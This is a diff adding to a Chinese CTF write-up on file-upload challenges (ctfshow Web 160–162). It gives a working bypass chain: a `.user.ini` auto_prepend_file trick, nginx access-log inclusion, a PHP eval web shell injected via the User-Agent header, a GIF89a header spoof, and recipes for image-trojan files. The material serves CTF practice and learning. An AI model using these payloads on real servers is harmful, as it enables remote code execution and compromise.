@@ -97,3 +97,31 @@
 
 
 这个题详细说一下吧，先改前端，将合法后缀改成`ini`，然后打开拦截，上传`.user.ini`，然后在Burp中修改MIME为`image/png`，内容：`auto_prepend_file=yi.png`，然后再改前端，改成png，然后上传`yi.png`，内容：`<?=include"/var/lo"."g/nginx/access.lo"."g"?>`，上传png的同时拦截修改UA为`<?php @eval($_POST['a']);?>`，然后就OK了，蚁剑连接`URL/uypload/index.php`或者直接`URL/uypload/`就行了。
+
+
+
+
+
+## Web 161 getimagesize()
+
+> 可参考 : https://blog.csdn.net/weixin_43915842/article/details/90183305
+
+我直接看了WP，这个题用`getimagesize()`对文件头做了检测，而且WP几乎都是用的GIF的文件头`GIF89a`，那我也就先这样了，需要注意的是，后台会对用户上传的每个文件都进行检验，所以不管是`.user.ini`还是我们要上传的图片，都需要在文件最开始加一个`GIF89a`，其余的和上一关一样，日志包含+UA。
+
+
+
+下面尝试一下PNG头`‰PNG`，JPG的就不考虑了，JPG头挺乱的。不行，连.user.ini都传不上去。
+
+**图片马制作的三种方法：**
+
+1. 直接伪造`GIF89a`这种
+2. CMD：copy /b test.png + yijuhua.php result.png
+3. 使用GIMP（开源的图片修改软件），通过增加备注，写入执行命令。
+
+
+
+
+
+## Web 162
+
+看了看WP，过滤了小数点，有个是给了python脚本，也不会用。还有一个用了VPS（虚拟专用服务器）（ip转数字），这让我咋做……
